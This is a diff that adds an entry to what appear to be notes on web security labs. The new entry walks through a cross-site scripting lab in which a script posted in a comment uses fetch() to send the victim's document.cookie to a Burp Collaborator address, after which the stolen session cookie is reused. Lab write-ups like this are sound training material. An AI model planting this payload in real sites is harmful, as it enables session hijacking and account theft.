@@ -24,3 +24,12 @@ TIP:-         Test every entry point.
       2. So we're encoding the < ' and > in html encoding and escaping ' with backslash and lab is solved.
 
 -----------------------------------------------------------------------------------------
+
+#4 Lab: Exploiting cross-site scripting to steal cookies
+
+     1. In comment section of any post enter the payload given below
+     <script>fetch('https://burpcollaborator-link/?cookie='+document.cookie);</script>
+     2. See the response in collaborator and gather cookie from there
+     3. Enter the sessioncookie in current session and lab is solved.
+
+-----------------------------------------------------------------------------------------
